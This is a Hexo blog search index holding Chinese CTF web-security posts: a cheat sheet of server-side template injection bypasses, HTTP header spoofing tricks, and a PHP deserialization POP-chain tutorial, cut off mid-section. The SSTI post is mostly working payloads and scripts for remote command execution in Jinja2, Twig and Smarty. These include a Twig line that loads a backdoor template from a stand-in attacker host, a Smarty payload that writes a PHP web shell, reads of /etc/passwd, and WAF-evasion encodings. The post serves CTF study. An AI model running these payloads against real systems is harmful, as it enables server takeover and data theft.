<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>各种ssti绕过及脚本</title>
      <link href="/posts/301c82e9.html"/>
      <url>/posts/301c82e9.html</url>
      
        <content type="html"><![CDATA[<h1 id="判断网站类型"><a href="#判断网站类型" class="headerlink" title="判断网站类型"></a>判断网站类型</h1><h2 id="自己查找判断"><a href="#自己查找判断" class="headerlink" title="自己查找判断"></a>自己查找判断</h2><p>在页面或者抓包回复里有时会泄露类型</p><h2 id="在疑似-ssti-处注入-7-7"><a href="#在疑似-ssti-处注入-7-7" class="headerlink" title="在疑似 ssti 处注入 ${7*7}"></a>在疑似 ssti 处注入 ${7*7}</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><h4 id="a-comment-b"><a href="#a-comment-b" class="headerlink" title="a{*comment*}b"></a>a{*comment*}b</h4><p>-ab smarty</p><h4 id="“z”-join-“ab”-z"><a href="#“z”-join-“ab”-z" class="headerlink" title="${“z”.join(“ab”)}z"></a>${“z”.join(“ab”)}z</h4><p>-zab mako</p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="7-‘7’"><a href="#7-‘7’" class="headerlink" title="{{7*‘7’}}"></a>{{7*‘7’}}</h4><p>49 -Twig,smarty<br>7777777 -Jinja2 &#x2F;&#x2F;最常见的 ssti 类型</p><h1 id="各种类型"><a href="#各种类型" class="headerlink" title="各种类型"></a>各种类型</h1><h2 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h2><h3 id="常规信息搜集"><a href="#常规信息搜集" class="headerlink" title="常规信息搜集"></a>常规信息搜集</h3><p>{{config}}<br>{{self.__dict__}}<br>{{url_for.__globals__}}<br>-&gt; {{url_for.__globals__[‘current_app’].config[‘FLAG’]}}<br>{{datetime}}<br>{{.Password}}</p><pre><code>{{a.__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)}}</code></pre><p>一个特解，不一定有效，如果有效就不用继续后面的了</p><h3 id="寻找危险类"><a href="#寻找危险类" class="headerlink" title="寻找危险类"></a>寻找危险类</h3><p>开头常见的有’’,””#&lt;class ‘str’&gt;, ()#&lt;class ‘tuple’&gt;。这里以’’为例，没有大的区别<br>{{‘’.__class__.__bases__}} 在这里找到 object 类<br>{{‘’.__class__.__bases__[0]}} &#x2F;&#x2F; &lt;class ‘object’&gt;<br>或是{{‘’.__class__.__mro__[2]}}&#x2F;&#x2F; &lt;class ‘object’&gt;<br>{{‘’.__class__.__bases__[0].__subclasses__()[?]}}<br>在？里填数字可以得到 对应的类，我们需要寻找危险类，它们能执行危险函数。<br>这里例如 os._wrap_close<br>跑脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:20440/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[<span class="subst">&#123;i&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">    <span class="comment"># GET</span></span><br><span class="line">    res = requests.get(url=url + <span class="string">f&quot;?name=<span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    <span class="comment"># data = &#123;</span></span><br><span class="line">    <span class="comment">#     &quot;flag&quot;: payload,</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment"># res = requests.post(url, data=data)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>拿到危险类后就可以随意构造了<br>这里跑出来值为 127</p><pre><code>{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)}}</code></pre><h3 id="一点关于-ssti-的绕过"><a href="#一点关于-ssti-的绕过" class="headerlink" title="一点关于 ssti 的绕过"></a>一点关于 ssti 的绕过</h3><h4 id="request-绕过-没被过滤全部可绕"><a href="#request-绕过-没被过滤全部可绕" class="headerlink" title="request 绕过(没被过滤全部可绕)"></a>request 绕过(没被过滤全部可绕)</h4><p>可以直接帮你绕过引号内的内容</p><pre><code>{{config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()}}&amp;os=os&amp;command=cat /flag</code></pre><h4 id="chr-绕过-没被过滤全部可绕"><a href="#chr-绕过-没被过滤全部可绕" class="headerlink" title="chr 绕过(没被过滤全部可绕)"></a>chr 绕过(没被过滤全部可绕)</h4><p>先找到 chr 所需的危险类</p><pre><code>{%set chr = x.__init__.__globals__[&#39;__builtins__&#39;].chr%}{{&quot;&quot;chr(46)+chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)+chr(46)+chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95)}}</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&#x27;__class__.__bases__&#x27;</span>;</span><br><span class="line">    <span class="variable">$ans</span>=<span class="string">&#x27;chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="number">0</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ans</span>.=<span class="string">&#x27;+chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ans</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="过滤了双大括号"><a href="#过滤了双大括号" class="headerlink" title="过滤了双大括号{{}}"></a>过滤了双大括号{{}}</h4><p>{{…}} -&gt; {%print(…)%}</p><h4 id="过滤了下划线"><a href="#过滤了下划线" class="headerlink" title="过滤了下划线"></a>过滤了下划线</h4><p>{{()|select|string}} 结果为<br>&lt;generator object select_or_reject at 0x7f7a6a450eb0&gt;<br>我们可以发现这里面出现了下划线，我们就可以造出下划线了<br>{{(()|select|string)[?]}}</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&lt;generator object select_or_reject at 0x7f7a6a450eb0&gt;&quot;</span></span><br><span class="line">pos = <span class="built_in">str</span>.find(<span class="string">&quot;_&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pos)</span><br><span class="line">payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;(()|select|string)[<span class="subst">&#123;pos&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h4 id="过滤了-和"><a href="#过滤了-和" class="headerlink" title="过滤了.和[]"></a>过滤了.和[]</h4><p>.过滤，用[]或者|attr()<br>.__class__.-&gt;[‘__class__‘]-&gt;|attr(‘__class__‘)<br>[]过滤了，用 pop 或者__getitem__</p><pre><code>{{&#39;&#39;.__class__.__mro__.__getitem__(0)}}</code></pre><p>[40]-&gt;pop(40)</p><h4 id="过滤了-class-bases-等关键字"><a href="#过滤了-class-bases-等关键字" class="headerlink" title="过滤了 class,bases 等关键字"></a>过滤了 class,bases 等关键字</h4><p>1.拼接</p><pre><code>{{&#39;&#39;[&#39;__cl&#39;&#39;ass__&#39;][&#39;__mr&#39;&#39;o__&#39;][1][&#39;__subc&#39;&#39;lasses__&#39;]()[140][&#39;__in&#39;&#39;it__&#39;][&#39;__glo&#39;&#39;bals__&#39;][&#39;popen&#39;](&#39;ls&#39;).read()}}</code></pre><p>2.倒置<br>.__class__. -&gt; ‘’[‘__ssalc__‘[::-1]]<br>3.格式化</p><pre><code>{%set ca=[&quot;{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}&quot;.format(95,95,99,108,97,115,115,95,95)]}{%set ca=[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]%}{%set ca=&#39;%c%c%c%c%c%c%c%c%c&#39;%(95,95,99,108,97,115,115,95,95)%}</code></pre><p>这个没写脚本，用的有点少<br>4.编码绕过<br>（1）unicode<br>__class__-&gt;[‘\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f’]<br>编码可在 cyberchef 的 escape unicode characters 中找到<br>（2）hex<br>__class__-&gt;[‘\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f’]</p><h4 id="fenjing-一把梭"><a href="#fenjing-一把梭" class="headerlink" title="fenjing 一把梭"></a>fenjing 一把梭</h4><p><a href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure><h4 id="fenjing-python-破解脚本"><a href="#fenjing-python-破解脚本" class="headerlink" title="fenjing python 破解脚本"></a>fenjing python 破解脚本</h4><p>waf 黑名单生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload, config_payload</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&quot;config&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;length&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;lipsum&quot;</span>,</span><br><span class="line">        <span class="string">&quot;[&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;０&quot;</span>,<span class="string">&quot;１&quot;</span>,<span class="string">&quot;２&quot;</span>,<span class="string">&quot;３&quot;</span>,<span class="string">&quot;４&quot;</span>,<span class="string">&quot;５&quot;</span>,<span class="string">&quot;６&quot;</span>,<span class="string">&quot;７&quot;</span>,<span class="string">&quot;８&quot;</span>,<span class="string">&quot;９&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">    shell_payload, _ = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="comment"># config_payload = config_payload(waf)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># print(f&quot;&#123;config_payload=&#125;&quot;)</span></span><br></pre></td></tr></table></figure><p>waf 返回文本生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://10.137.0.28:5000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@functools.lru_cache(<span class="params"><span class="number">1000</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    time.sleep(<span class="number">0.02</span>)  <span class="comment"># 防止请求发送过多</span></span><br><span class="line">    resp = requests.get(URL, timeout=<span class="number">10</span>, params=&#123;<span class="string">&quot;name&quot;</span>: payload&#125;)</span><br><span class="line">    waf_text = <span class="string">&quot;BAD&quot;</span>  <span class="comment"># 被waf返回文本</span></span><br><span class="line">    <span class="keyword">return</span> waf_text <span class="keyword">not</span> <span class="keyword">in</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;ls /&quot;</span></span><br><span class="line">    shell_payload, will_print = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> will_print:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这个payload不会产生回显！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>自行修改~</p><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><pre><code>{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}//查看iduser={{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;cat /f*&quot;)}}{{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}}{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;cat /etc/passwd&quot;)}}&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;cat /etc/passwd&quot;) }</code></pre><h2 id="Tornado-render"><a href="#Tornado-render" class="headerlink" title="Tornado render"></a>Tornado render</h2><pre><code>http://ip:port/error?msg={{handler.settings}}</code></pre><h2 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h2><pre><code>{$smarty.version}{if system(&#39;ls&#39;)}{/if}{self::getStreamVariable(&quot;file:///etc/passwd&quot;)}{function+name=&#39;rce(){};@eval($_POST[1]);function%0a%0a&#39;}{/function}{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())}{literal}alert(&#39;xss&#39;);{/literal}{if readfile(&#39;/flag&#39;)}{/if}</code></pre><h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><pre><code>{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的各种http要求以及对应的headers</title>
      <link href="/posts/93fc8735.html"/>
      <url>/posts/93fc8735.html</url>
      
        <content type="html"><![CDATA[<h1 id="GET-传参"><a href="#GET-传参" class="headerlink" title="GET 传参"></a>GET 传参</h1><p>传参传的参数会被理解成字符串, 传数组如下，[]内不填默认为 0<br>xxx.com&#x2F;?a&#x3D;1&amp;b&#x3D;2&amp;c[0]&#x3D;3&amp;c[1]&#x3D;4&amp;d[]&#x3D;5</p><h1 id="POST-传参"><a href="#POST-传参" class="headerlink" title="POST 传参"></a>POST 传参</h1><p>把 GET 请求改为 POST,如果用的 burp 可以用这个一键切<br><img src="/img/http/change_request.png"></p><p>不能切的话把 GET 改为 POST，在下面加<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 0<br>Content-Length 需要改数值，建议勾选 burp 的修改 body 长度（默认勾选）不用手动更改，数值取决于你 POST 传参的长度，如 a&#x3D;4 长度为 3<br>当存在 Transfer-Encoding: chunked 时，Content-Length 会被忽略<br>没有 POST 传参最后要留两行空，不然会无法打开<br>POST 参数跟 http 头之间要空一行，后面不能有空行</p><p><img src="/img/http/post_request.png"></p><h1 id="PUT-等更多类型的传参"><a href="#PUT-等更多类型的传参" class="headerlink" title="PUT 等更多类型的传参"></a>PUT 等更多类型的传参</h1><p>直接把 GET 开头改成 PUT 就行</p><h1 id="要求-ip-地址为-127-0-0-1-要求本地权限"><a href="#要求-ip-地址为-127-0-0-1-要求本地权限" class="headerlink" title="要求 ip 地址为 127.0.0.1 &#x2F; 要求本地权限"></a>要求 ip 地址为 127.0.0.1 &#x2F; 要求本地权限</h1><p>这种要求如果在 http 题中只要 xff 伪造 ip 就行，如果要 ssrf 伪造它就不是 http 题</p><p>X-Forwarded-For: 127.0.0.1<br>Client-IP: 127.0.0.1<br>X-Real-IP: 127.0.0.1<br>这三个任选添加，都可能通过，大小写随意，注意 xff 的 ed 不要少写。</p><h1 id="要求挂代理"><a href="#要求挂代理" class="headerlink" title="要求挂代理"></a>要求挂代理</h1><p>via: xxx.vip</p><h1 id="SERVER-‘FLAG’-’123’等-php-参数"><a href="#SERVER-‘FLAG’-’123’等-php-参数" class="headerlink" title="$_SERVER[‘FLAG’]&#x3D;&#x3D;’123’等 php 参数"></a>$_SERVER[‘FLAG’]&#x3D;&#x3D;’123’等 php 参数</h1><p>FLAG: 123</p><h1 id="要求改-UA-浏览器"><a href="#要求改-UA-浏览器" class="headerlink" title="要求改 UA &#x2F; 浏览器"></a>要求改 UA &#x2F; 浏览器</h1><p>User-Agent: Firefox Browser</p><h1 id="要求你的邮件地址"><a href="#要求你的邮件地址" class="headerlink" title="要求你的邮件地址"></a>要求你的邮件地址</h1><p>From: <a href="mailto:&#120;&#x78;&#x78;&#x40;&#x65;&#x78;&#x61;&#109;&#x70;&#x6c;&#101;&#46;&#x63;&#x6f;&#109;">&#120;&#x78;&#x78;&#x40;&#x65;&#x78;&#x61;&#109;&#x70;&#x6c;&#101;&#46;&#x63;&#x6f;&#109;</a></p><h1 id="要求来自-网址-origin"><a href="#要求来自-网址-origin" class="headerlink" title="要求来自 网址 (origin)"></a>要求来自 网址 (origin)</h1><p>Referer: xxx.org</p><h1 id="要求改-Cookie"><a href="#要求改-Cookie" class="headerlink" title="要求改 Cookie"></a>要求改 Cookie</h1><p>格式如 Cookie: user&#x3D;admin</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php的pop链构造&amp;反序列化</title>
      <link href="/posts/32daafef.html"/>
      <url>/posts/32daafef.html</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>构造 pop 链，归根结底就是一条绳子，从你开始的函数穿到危险函数（或者指向 flag），所以你要做的第一件事，就是确认你的开始和结尾。</p><h1 id="部分魔术方法触发方法"><a href="#部分魔术方法触发方法" class="headerlink" title="部分魔术方法触发方法"></a>部分魔术方法触发方法</h1><p><strong>__wakeup()</strong> 使用 unserialize()时触发<br><strong>__construct()</strong> 当创建对象时触发<br><strong>__destruct()</strong> 当一个对象被销毁时触发<br><strong>__toString()</strong> 当一个类被当成字符串使用时触发，如 echo<br><strong>__invoke()</strong> 当尝试以调用函数的方式调用一个对象时触发<br><strong>__call()</strong> 在对象上下文中调用不可访问的方法时触发<br><strong>__callStatic()</strong> 在静态上下文中调用不可访问的方法时触发<br><strong>__get()</strong> 用于从不可访问的属性读取数据<br><strong>__set()</strong> 用于将数据写入不可访问的属性<br><strong>__isset()</strong> 在不可访问的属性上调用 isset()或 empty()触发<br><strong>__unset()</strong> 在不可访问的属性上使用 unset()时触发<br><strong>__sleep()</strong> 使用 serialize()时触发</p><h1 id="不含绕过的链子构造"><a href="#不含绕过的链子构造" class="headerlink" title="不含绕过的链子构造"></a>不含绕过的链子构造</h1><p>__wakeup(),__construct(),__destruct() 都可以看做开头，优先级从左到右。你要做的，就是引导这个绳子头，直至穿到危险函数。</p><p>我们来看一道例题，这是我在学习构造 pop 链时做出的第一道题，出自 Geek Challenge 2024 unsign</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)#4</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();<span class="comment">#3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;<span class="comment">#2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);<span class="comment">#1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先我们注意到 class web 下存在一种很危险的格式<br>**$eva1($this-&gt;interesting);<strong>也就是在 eva1&#x3D;”eval”时，就等于 eval()了，所以它作为尾。标个 1<br>然后我们需要触发__get()方法。这个方法常在调用私有或不存在对象时触发。怎么触发呢，我们观察 php 代码，观察到 lover 下的</strong>return $this-&gt;yxx-&gt;QW;**很可疑。我们可以控制 yxx 的 class，将它设为 web。这样当这条语句触发时，QW 找不到，就会触发我们的**get()，标为 2<br>__invoke()算是最容易看出来的方法了，只要变量作为函数来调用就会触发。所以 syc 的$function();可以触发。标个 3<br>destruct 可以作为头，结束 标个 4<br>所以链子总结如下</p><pre><code>url-&gt;syc#__destruct()-&gt;cuit-&gt;lover#\_\_invoke(&#39;$function&#39;)-&gt;yxx-&gt;web#\_\_get(&#39;QW&#39;)-&gt;system(&#39;cat /flag&#39;)</code></pre><p>关键 exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$syc</span>=<span class="keyword">new</span> <span class="title function_ invoke__">syc</span>();</span><br><span class="line"><span class="variable">$lover</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$web</span>=<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$syc</span>;</span><br><span class="line"><span class="variable">$url</span>-&gt;cuit=<span class="variable">$lover</span>;</span><br><span class="line"><span class="variable">$lover</span>-&gt;yxx=<span class="variable">$web</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$url</span>);<span class="comment">//url-&gt;syc#__destruct()-&gt;cuit-&gt;lover#__invoke(&#x27;$function&#x27;)-&gt;yxx-&gt;web#__get(&#x27;QW&#x27;)-&gt;system(&#x27;cat /flag&#x27;)</span></span><br></pre></td></tr></table></figure><h1 id="需要绕过的链子构造"><a href="#需要绕过的链子构造" class="headerlink" title="需要绕过的链子构造"></a>需要绕过的链子构造</h1><h2 id="private-和-protected-属性的变量"><a href="#private-和-protected-属性的变量" class="headerlink" title="private 和 protected 属性的变量"></a>private 和 protected 属性的变量</h2><p>输出 serialize 时一定要经过编码，基本是 url 编码，如果题目要求 base64 编码就不用先 url 编码了<br>如果你要对 private 和 protected 里的数赋值时，如果 php 版本低可能没回显。<br>养成良好习惯，使用__construct()赋值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> a=<span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> b;</span><br><span class="line">    <span class="keyword">protected</span> c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强调下 construct 的赋值方式，不能直接写$b,要写$this-&gt;b,且 function 前加 public。</p><h2 id="str-replace-替换字符导致的字符串逃逸"><a href="#str-replace-替换字符导致的字符串逃逸" class="headerlink" title="str_replace 替换字符导致的字符串逃逸"></a>str_replace 替换字符导致的字符串逃逸</h2><p>比如替换函数为 str_replace(‘SDPCSEC’,’hacker’,$parm);我们注意到每次替换就少了一个字符，但被替换的字符串前的数字没有变，所以我们就可以构造字符个数，每输出一次就会吞掉后面一个字符，最后的参数就由你自己控制了。<br>一个参考的输出程序，可以把篡改字符串放在$a 里，注意开头要加”用于闭合引号</p><h3 id="字符变少"><a href="#字符变少" class="headerlink" title="字符变少"></a>字符变少</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&quot;;s:1:&quot;B&quot;;s:12:&quot;[phpinfo();]&quot;;s:1:&quot;C&quot;;N;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;SDPCSEC&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="字符变多"><a href="#字符变多" class="headerlink" title="字符变多"></a>字符变多</h3><p>提前闭合，因为反序列化会舍去;}后的任何内容。<br>轮子还没造，待实现中。。。</p><h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="wakeup 绕过"></a>wakeup 绕过</h2><h3 id="增加属性对象绕过（CVE-2016-7124）"><a 